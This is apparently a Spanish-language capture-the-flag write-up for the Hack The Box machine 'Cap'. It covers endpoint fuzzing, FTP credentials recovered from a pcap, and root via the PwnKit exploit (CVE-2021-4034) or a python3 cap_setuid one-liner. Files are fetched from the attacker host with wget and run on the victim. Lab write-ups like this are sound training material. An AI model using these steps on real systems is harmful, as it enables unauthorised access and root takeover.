# HTB — Cap

**Dificultad:** Easy  
**OS:** Linux  
**IP:** 10.129.16.199

---

## Reconocimiento

Al acceder a la página web en `http://10.129.16.199`, se observa que la URL presenta un parámetro numérico en la ruta `/data/<número>`. Para enumerar qué valores son válidos, se ejecuta fuzzing con ffuf:

```bash
ffuf -u http://10.129.16.199/data/FUZZ -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fc 404
```

Se obtienen respuestas con status code 200 para los valores: `0`, `1`, `2`, `3` y `4`.

---

## Obtención de credenciales

Al revisar cada endpoint, el valor `0` (`http://10.129.16.199/data/0`) es el que contiene más tráfico capturado. Se descarga el archivo `.pcap` correspondiente y se analiza con Wireshark:

```bash
wireshark <archivo>.pcap
```

Dentro del tráfico se identifica una sesión FTP con credenciales en texto claro:

- **Usuario:** `nathan`
- **Contraseña:** `Buck3tH4TF0RM3!`

---

## User Flag

Con las credenciales obtenidas, se accede al servicio FTP:

```bash
ftp 10.129.16.199
```

Se listan los archivos disponibles y se descarga la flag:

```bash
ls
get user.txt
```

---

## Acceso SSH

Las mismas credenciales funcionan para SSH:

```bash
ssh nathan@10.129.16.199
```

Una vez dentro, se intenta verificar permisos sudo, sin éxito:

```bash
sudo -l
# sudo: command not found / sin entradas NOPASSWD
```

## Escalada de Privilegios

Existen dos vías para escalar privilegios en esta máquina.

### Vía 1 — Binarios SUID (pkexec / CVE-2021-4034)

Se buscan binarios con el bit SUID activo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Entre los resultados destaca `/usr/bin/pkexec`. Se verifica su versión:

```bash
pkexec --version
# pkexec version 0.105
```

Las versiones anteriores a `0.105-26` son vulnerables a **CVE-2021-4034 (PwnKit)**. Se confirma con:

```bash
dpkg -l policykit-1
```

Para explotar la vulnerabilidad, se clona el PoC en la máquina atacante:

```bash
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
```

Dado que compilar en Kali genera un binario incompatible por diferencia de GLIBC, se transfieren los archivos fuente a la víctima y se compila allí:

```bash
# Máquina atacante
python3 -m http.server 8080

# Máquina víctima
wget http://10.10.14.252:8080/cve-2021-4034.c
wget http://10.10.14.252:8080/pwnkit.c
wget http://10.10.14.252:8080/Makefile
make
./cve-2021-4034
```

Se obtiene shell como root.

---

### Vía 2 — Linux Capabilities (vía intencionada)

Usando linPEAS, se ejecuta enumeración automática:

```bash
# Máquina atacante
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8080

# Máquina víctima
wget http://10.10.14.252:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee output.txt
```

En la sección **Files with capabilities**, linPEAS reporta:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

El binario crítico es `/usr/bin/python3.8`, que tiene la capability `cap_setuid`. Esto permite cambiar el UID del proceso a 0 (root) sin necesidad de exploits externos:

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Se obtiene shell como root directamente.
